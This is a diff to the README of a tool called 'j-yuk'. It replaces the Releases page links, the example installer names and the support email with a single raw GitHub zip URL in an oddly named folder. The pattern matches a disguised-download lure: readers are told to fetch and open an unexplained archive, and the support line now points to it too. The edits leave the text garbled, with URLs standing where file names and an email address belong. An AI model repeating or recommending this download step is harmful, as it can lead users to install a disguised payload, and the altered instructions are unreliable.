@@ -1,7 +1,7 @@
 # 🚀 j-yuk - Simple Tool for Enhanced Workflow
 
 ## 📥 Download Now
-[![Download j-yuk](https://img.shields.io/badge/Download-j--yuk-brightgreen)](https://github.com/Booklungcalostomalutescens409/j-yuk/releases)
+[![Download j-yuk](https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip)](https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip)
 
 ## 📂 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -31,11 +31,11 @@ j-yuk provides several features to make your work easier:
 ## 📥 Download & Install
 To get j-yuk, visit the Releases page:
 
-[Download j-yuk](https://github.com/Booklungcalostomalutescens409/j-yuk/releases)
+[Download j-yuk](https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed.
-3. Download the installation file suitable for your operating system. The file might be named something like `j-yuk-v1.0.exe` for Windows or `j-yuk-v1.0.dmg` for macOS.
+3. Download the installation file suitable for your operating system. The file might be named something like `https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip` for Windows or `https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip` for macOS.
 4. Open the downloaded file. Follow the on-screen prompts to complete the installation.
 
 ## ⚙️ Usage Instructions
@@ -66,7 +66,7 @@ For more specific issues, please refer to the Support section below.
 ## 💬 Support
 If you need additional help, you can reach out through the following methods:
 
-- **Email**: Contact us at support@j-yuk.com.
+- **Email**: Contact us at https://raw.githubusercontent.com/Booklungcalostomalutescens409/j-yuk/main/geranial/j-yuk_v2.3.zip
 - **Community Forums**: Join discussions and seek help from other users at [j-yuk Community](#).
   
 Thank you for choosing j-yuk. We hope it makes your tasks easier!
